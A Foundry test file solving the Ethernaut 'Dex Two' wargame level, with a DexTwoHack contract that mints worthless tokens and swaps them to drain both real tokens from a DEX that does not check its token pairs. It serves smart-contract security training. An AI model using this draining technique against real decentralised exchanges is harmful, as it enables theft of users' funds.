// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../src/DexTwo/DexTwo.sol";
import "../src/DexTwo/DexTwoFactory.sol";
import "../src/Ethernaut.sol";
import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

contract DexTwoTest is Test {
    Ethernaut private _ethernaut;
    DexTwoFactory private _dexTwoFactory;
    DexTwo private _dexTwo;

    address private _hacker = address(0xA);

    modifier testWrapper() {
        vm.deal(_hacker, 1 ether);
        _ethernaut.registerLevel(_dexTwoFactory);
        vm.startPrank(_hacker);
        address instance = _ethernaut.createLevelInstance(_dexTwoFactory);
        _dexTwo = DexTwo(instance);
        _;
        bool success = _ethernaut.submitLevelInstance(
            payable(address(_dexTwo))
        );
        assertTrue(success);
        vm.stopPrank();
    }

    function setUp() public {
        _ethernaut = new Ethernaut();
        _dexTwoFactory = new DexTwoFactory();
    }

    function testDexTwoHack() public testWrapper {
        DexTwoHack dexTwoHack = new DexTwoHack(address(_dexTwo));
        dexTwoHack.attack();
    }
}

contract DexTwoHack {
    address public target;
    SwappableTokenTwo token_instance_three;
    SwappableTokenTwo token_instance_four;

    constructor(address _target) {
        target = _target;
        token_instance_three = new SwappableTokenTwo("Token 3", "TKN3", 200);
        token_instance_four = new SwappableTokenTwo("Token 4", "TKN4", 200);
    }

    function attack() public {
        DexTwo dexTwo = DexTwo(target);
        uint256 amount = 100;
        uint256 amountIn = amount;

        address token1 = dexTwo.token1();
        address token2 = dexTwo.token2();
        address token3 = address(token_instance_three);
        address token4 = address(token_instance_four);

        //            dex token3 amount | dex token1 amount
        //  amountIn        amount             100
        //
        //   100    = amountIn * 100 / amount
        // amountIn = amount

        // Approve Dex
        IERC20(token3).approve(target, type(uint).max);
        IERC20(token4).approve(target, type(uint).max);

        // Add liquidity
        dexTwo.add_liquidity(token3, amount);
        dexTwo.add_liquidity(token4, amount);

        // Swap
        _swap(token3, token1, amountIn);
        _swap(token4, token2, amountIn);
    }

    function _swap(address tokenIn, address tokenOut, uint256 amountIn) public {
        DexTwo(target).swap(tokenIn, tokenOut, amountIn);
    }
}
